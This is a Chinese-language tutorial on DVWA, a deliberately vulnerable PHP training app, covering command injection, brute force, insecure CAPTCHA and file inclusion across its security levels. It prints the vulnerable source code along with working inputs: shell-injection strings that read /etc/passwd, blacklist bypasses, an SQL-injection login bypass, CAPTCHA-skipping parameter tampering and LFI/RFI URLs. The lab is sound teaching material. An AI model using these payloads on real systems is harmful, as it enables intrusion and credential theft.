# DVWA（Damn Vulnerable Web Application）

DVWA（Damn Vulnerable Web Application）是一個用來進行安全脆弱性鑒定的PHP/MySQL Web應用，
旨在為安全專業人員測試自己的專業技能和工具提供合法的環境，幫助web開發者更好的理解web應用安全防范的過程。

### [演練平台](http://120.114.102.164)

### [OWASP TOP 10漏洞(OWASP Top 10 2017)](https://www.owasp.org/index.php/Top_10-2017_Top_10)

```
A1:2017-Injection
A2:2017-Broken Authentication
A3:2017-Sensitive Data Exposure
A4:2017-XML External Entities (XXE){新增}
A5:2017-Broken Access Control
A6:2017-Security Misconfiguration
A7:2017-Cross-Site Scripting (XSS)
A8:2017-Insecure DeserializationP{新增}
Insecure deserialization often leads to remote code execution.

A9:2017-Using Components with Known Vulnerabilities
A10:2017-Insufficient Logging&Monitoring{新增}
```

# DVWA漏洞模組(未涵蓋2017年版TOP 10)

>* Command Injection（命令行注入）
>* SQL Injection（SQL注入）
>* SQL Injection（Blind）（SQL盲注）
>* Brute Force（暴力（破解））
>* Insecure CAPTCHA（不安全的驗證碼)
>* File Inclusion（文件包含）
>* File Upload（文件上傳）

>* XSS（Reflected）（反射型跨站腳本）
>* XSS（Stored）（存儲型跨站腳本）
>* XSS(DOM)
>* CSRF（跨站請求偽造）

DVWA 分為四種安全級別：Low，Medium，High，Impossible

# DVWA 測試步驟
```
步驟一:登錄DVWA

步驟二:選擇安全級別
將dvwa-security-裏面的安全級別調到最低級別

步驟三:選擇題目頁面

步驟四:進行攻擊測試
```

# Command Injection（命令行注入）

>* [3-Command Injection | Low | Medium | High | DVWA Video Tutorial Series](https://www.youtube.com/watch?v=0ln7nsCQlaI)

### Low
***
```
攻擊測試

step 1: 輸入127.0.0.1 ==> 點擊submit
step 2: 輸入127.0.0.1 ; cat /etc/passwd ==> 點擊submit


真正駭客會注入一隻one-line PHP webshell[請自行研讀!~請勿做壞事]

輸入127.0.0.1 ; {one-line PHP webshell} ==> 點擊submit

==>你的成果畫面

```
>* [DVWA - Command Injection注入一隻網站木馬](https://www.youtube.com/watch?v=NxSNTT627TQ)

關鍵程式碼解析
```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // 使用$_REQUEST來接收輸入的IP(完全沒有驗證使用者輸入的資料) 
    $target = $_REQUEST[ 'ip' ]; 

    // 決定作業系統並執行相對應的ping指令 OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```
>* PHP 預先定義的變數(Predefined Variables)$_REQUEST



### Medium

關鍵程式碼解析==>使用黑名單(blacklist)過濾
```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = $_REQUEST[ 'ip' ]; 

    // Set blacklist 設定黑名單
    $substitutions = array( 
        '&&' => '', 
        ';'  => '', 
    ); 

    // 使用黑名單(blacklist)過濾 Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```

攻擊技法==>繞過黑名單(blacklist)過濾==>使用 | 
```
127.0.0.1 | cat /etc/passwd
```

### High

更完整的黑名單(blacklist)過濾
```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = trim($_REQUEST[ 'ip' ]); 

    // Set blacklist 
    $substitutions = array( 
        '&'  => '', 
        ';'  => '', 
        '| ' => '', 
        '-'  => '', 
        '$'  => '', 
        '('  => '', 
        ')'  => '', 
        '`'  => '', 
        '||' => '', 
    ); 

    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```
攻擊1==>繞過黑名單(blacklist)過==>把空白拿掉 ==>殘念
```
127.0.0.1|cat /etc/passwd
127.0.0.1|cat%20/etc/passwd
```
攻擊2==>繞過黑名單(blacklist)過==>使用 | ==>部分有用
```
127.0.0.1|ls
```


### Impossible<<至高無上防禦工法>>

更嚴謹的防禦==>這下打不進去了吧!==>若你打得進去我請你吃年肉麵
```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $target = $_REQUEST[ 'ip' ]; 
    $target = stripslashes( $target ); 

    // Split the IP into 4 octects 
    $octet = explode( ".", $target ); 

    // Check IF each octet is an integer 
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { 
        // If all 4 octets are int's put the IP back together. 
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; 

        // Determine OS and execute the ping command. 
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
            // Windows 
            $cmd = shell_exec( 'ping  ' . $target ); 
        } 
        else { 
            // *nix 
            $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
        } 

        // Feedback for the end user 
        echo "<pre>{$cmd}</pre>"; 
    } 
    else { 
        // Ops. Let the user name theres a mistake 
        echo '<pre>ERROR: You have entered an invalid IP.</pre>'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?> 
```

# SQL Injection（SQL注入）

### Low


### Medium

### High

### Impossible

# SQL Injection（Blind）（SQL盲注）

### Low

### Medium
```
```

### High

### Impossible

# Brute Force（暴力（破解））

### Low
使用Sqli就可以成功
```
在Username欄位填入admin' or '1'='1
即可成功
```
成功畫面顯示
```
Welcome to the password protected area admin' or '1'='1
```

關鍵程式碼解析
```
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```
### Medium

關鍵程式碼解析
```
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

第一次攻擊測試:使用Sqli
```
在Username欄位填入admin' or '1'='1
```
失敗畫面顯示
```
Username and/or password incorrect.
```
第二次攻擊測試:

### High

>* High等級的程式碼加入了Token，可以防預CSRF攻擊，同時也增加了暴力破解的難度

關鍵程式碼解析
```
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

攻擊測試:
```
https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-bruteforce-high-http-get.py
```

### Impossible==>你能攻擊此程式嗎?

```
<?php

if( isset( $_POST[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_POST[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_POST[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Default values
    $total_failed_login = 3;
    $lockout_time       = 15;
    $account_locked     = false;

    // Check the database (Check user information)
    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // Check to see if the user has been locked out.
    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
        // User locked out.  Note, using this method would allow for user enumeration!
        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

        // Calculate when the user would be allowed to login again
        $last_login = $row[ 'last_login' ];
        $last_login = strtotime( $last_login );
        $timeout    = strtotime( "{$last_login} +{$lockout_time} minutes" );
        $timenow    = strtotime( "now" );

        // Check to see if enough time has passed, if it hasn't locked the account
        if( $timenow > $timeout )
            $account_locked = true;
    }

    // Check the database (if username matches the password)
    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR);
    $data->bindParam( ':password', $pass, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // If its a valid login...
    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
        // Get users details
        $avatar       = $row[ 'avatar' ];
        $failed_login = $row[ 'failed_login' ];
        $last_login   = $row[ 'last_login' ];

        // Login successful
        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";
        echo "<img src=\"{$avatar}\" />";

        // Had the account been locked out since last login?
        if( $failed_login >= $total_failed_login ) {
            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
        }

        // Reset bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }
    else {
        // Login failed
        sleep( rand( 2, 4 ) );

        // Give the user some feedback
        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

        // Update bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }

    // Set the last login time
    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

# Insecure CAPTCHA（不安全的驗證碼)

>* Authentication認證機制:通過一定的手段，完成對使用者身分的確認
>* 網站的存取權限(登入權限)基本都會以帳號與密碼為認證機制
>* 除此之外還有其他補強機制如CAPTCHA 圖形驗證碼
>* CAPTCHA==Completely Automated Public Turing Test to Tell Computers and Humans Apart

>* 多重要素(因子)驗證[Multi-factor authentication;MFA]
>* 雙重認證[Two-factor authentication;2FA]{雙重驗證|雙因素認證|二元認證}
>* 兩步驟驗證[2-Step Verification]{兩步驗證}
>* 使用兩種不同的元素，合併在一起，來確認使用者的身份，是多因素驗證中的一個特例。
>* 雙重認證範例:{銀行卡+ PIN碼}:使用銀行卡時，需要另外輸入PIN碼，確認之後才能使用其轉帳功能。

>* 測試環境說明:
### Low


一般測試步驟:: <font color="blue"> 輸入驗證碼才可修改密碼 <font>

```
攻擊測試步驟::使用burpsuite攔截封包將step=1修改為step=2,即可略過CAPTCHA驗證
```
關鍵程式碼分析

客戶端(使用者端)程式分析
```
................


	<div class="vulnerable_code_area">
		<form action="#" method="POST" >
			<h3>Change your password:</h3>
			<br />

			<input type="hidden" name="step" value="1" />
			New password:<br />
			<input type="password" AUTOCOMPLETE="off" name="password_new"><br />
			Confirm new password:<br />
			<input type="password" AUTOCOMPLETE="off" name="password_conf"><br />

			
		<script src='https://www.google.com/recaptcha/api.js'></script>
		<br /> <div class='g-recaptcha' data-theme='dark' data-sitekey='6Ldg-VcUAAAAAEHnHni9V92-gquni6bFKSHJ5YQM'></div>
	
			<br />

			<input type="submit" value="Change" name="Change">
		</form>
		<pre><br />The CAPTCHA was incorrect. Please try again.</pre>
	</div>
 
 ................
```
伺服器端程式分析
```
<?php 

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check CAPTCHA from 3rd party 
    $resp = recaptcha_check_answer( 
        $_DVWA[ 'recaptcha_private_key'], 
        $_POST['g-recaptcha-response'] 
    ); 

    // Did the CAPTCHA fail? 
    if( !$resp ) { 
        // What happens when the CAPTCHA was entered incorrectly 
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
        $hide_form = false; 
        return; 
    } 
    else { 
        // CAPTCHA was correct. Do both new passwords match? 
        if( $pass_new == $pass_conf ) { 
            // Show next stage for the user 
            echo " 
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
                <form action=\"#\" method=\"POST\"> 
                    <input type=\"hidden\" name=\"step\" value=\"2\" /> 
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
                    <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
                </form>"; 
        } 
        else { 
            // Both new passwords do not match. 
            $html     .= "<pre>Both passwords must match.</pre>"; 
            $hide_form = false; 
        } 
    } 
} 

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check to see if both password match 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
        $pass_new = md5( $pass_new ); 

        // Update database 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with the passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
        $hide_form = false; 
    } 

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); 
} 

?> 
```
### Medium
```
攻擊測試步驟::
使用burpsuite攔截封包並修改封包
將step=1修改為step=2,再增加&passed_captcha=true,即可略過CAPTCHA驗證
```
關鍵程式碼分析
``` 
<?php 

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check CAPTCHA from 3rd party 
    $resp = recaptcha_check_answer( 
        $_DVWA[ 'recaptcha_private_key' ], 
        $_POST['g-recaptcha-response'] 
    ); 

    // Did the CAPTCHA fail? 
    if( !$resp ) { 
        // What happens when the CAPTCHA was entered incorrectly 
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
        $hide_form = false; 
        return; 
    } 
    else { 
        // CAPTCHA was correct. Do both new passwords match? 
        if( $pass_new == $pass_conf ) { 
            // Show next stage for the user 
            echo " 
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
                <form action=\"#\" method=\"POST\"> 
                    <input type=\"hidden\" name=\"step\" value=\"2\" /> 
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /> 
                    <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
                </form>"; 
        } 
        else { 
            // Both new passwords do not match. 
            $html     .= "<pre>Both passwords must match.</pre>"; 
            $hide_form = false; 
        } 
    } 
} 

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check to see if they did stage 1 
    if( !$_POST[ 'passed_captcha' ] ) { 
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>"; 
        $hide_form = false; 
        return; 
    } 

    // Check to see if both password match 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
        $pass_new = md5( $pass_new ); 

        // Update database 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with the passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
        $hide_form = false; 
    } 

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); 
} 

?> 

```

### High
```
攻擊測試步驟::
使用burpsuite攔截封包並修改封包
將step=1修改為step=2,再增加&passed_captcha=true,
再修改程式碼檢查參數
recaptcha_response_field=hidd3n_valu3
User-Agent:reCAPTCHA
即可略過CAPTCHA驗證
```

關鍵程式碼分析
```
<?php 

if( isset( $_POST[ 'Change' ] ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check CAPTCHA from 3rd party 
    $resp = recaptcha_check_answer( 
        $_DVWA[ 'recaptcha_private_key' ], 
        $_POST['g-recaptcha-response'] 
    ); 

    if ( 
        $resp ||  
        ( 
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3' 
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA' 
        ) 
    ){ 
        // CAPTCHA was correct. Do both new passwords match? 
        if ($pass_new == $pass_conf) { 
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
            $pass_new = md5( $pass_new ); 

            // Update database 
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;"; 
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for user 
            echo "<pre>Password Changed.</pre>"; 

        } else { 
            // Ops. Password mismatch 
            $html     .= "<pre>Both passwords must match.</pre>"; 
            $hide_form = false; 
        } 

    } else { 
        // What happens when the CAPTCHA was entered incorrectly 
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
        $hide_form = false; 
        return; 
    } 

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?> 
```
### Impossible

關鍵程式碼分析
```
<?php 

if( isset( $_POST[ 'Change' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_new  = stripslashes( $pass_new ); 
    $pass_new  = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
    $pass_new  = md5( $pass_new ); 

    $pass_conf = $_POST[ 'password_conf' ]; 
    $pass_conf = stripslashes( $pass_conf ); 
    $pass_conf = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
    $pass_conf = md5( $pass_conf ); 

    $pass_curr = $_POST[ 'password_current' ]; 
    $pass_curr = stripslashes( $pass_curr ); 
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
    $pass_curr = md5( $pass_curr ); 

    // Check CAPTCHA from 3rd party 
    $resp = recaptcha_check_answer( 
        $_DVWA[ 'recaptcha_private_key' ], 
        $_POST['g-recaptcha-response'] 
    ); 

    // Did the CAPTCHA fail? 
    if( !$resp ) { 
        // What happens when the CAPTCHA was entered incorrectly 
        echo "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
        $hide_form = false; 
        return; 
    } 
    else { 
        // Check that the current password is correct 
        $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); 
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
        $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR ); 
        $data->execute(); 

        // Do both new password match and was the current password correct? 
        if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) { 
            // Update the database 
            $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); 
            $data->bindParam( ':password', $pass_new, PDO::PARAM_STR ); 
            $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
            $data->execute(); 

            // Feedback for the end user - success! 
            echo "<pre>Password Changed.</pre>"; 
        } 
        else { 
            // Feedback for the end user - failed! 
            echo "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>"; 
            $hide_form = false; 
        } 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?> 

```
# File Inclusion（文件包含）

>* File Inclusion[檔案包含]:當伺服器開啟allow_url_include選項時，就可通過php的某些特性函數[include()，require()和include_once()，require_once()]利用url去動態包含文件

[File inclusion vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)
>* 如果沒有對檔案來源進行嚴格審查，就會導致任意檔案讀取或者任意命令執行。
>* 分為本地檔包含漏洞(Local file Inclusion(LFI))與遠端檔包含漏洞(Remote file Inclusion(RFL))
>* 遠端檔包含漏洞是因為開啟了php配置中的allow_url_fopen選項（選項開啟之後，伺服器允許包含一個遠端的檔）。

### Low
***
步驟一:點選網站上的超連結==?仔細看瀏覽器的變化
```
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file1.php
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file2.php
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file3.php
```
步驟二:測試是否存在File inclusion vulnerability
```
LFI 攻擊測試==>
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=/etc/passwd
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=../../etc/passwd

RFI 攻擊測試==>
http://192.168.1.250/DVWA/vulnerabilities/fi/? page=http://www.google.com
```
不肖客是如何利用RFI 漏洞?
>* 不肖客自己先植入惡意程式在國外網站
>* 在攻擊有RFI 漏洞並用來讀取別台機器上的惡意程式

客戶端程式分析
```
<div class="body_padded">
	<h1>Vulnerability: File Inclusion</h1>

	

	<div class="vulnerable_code_area">
		[<em><a href="?page=file1.php">file1.php</a></em>] - [<em><a href="?page=file2.php">file2.php</a></em>] - [<em><a href="?page=file3.php">file3.php</a></em>]
	</div>

	<h2>More Information</h2>
	<ul>
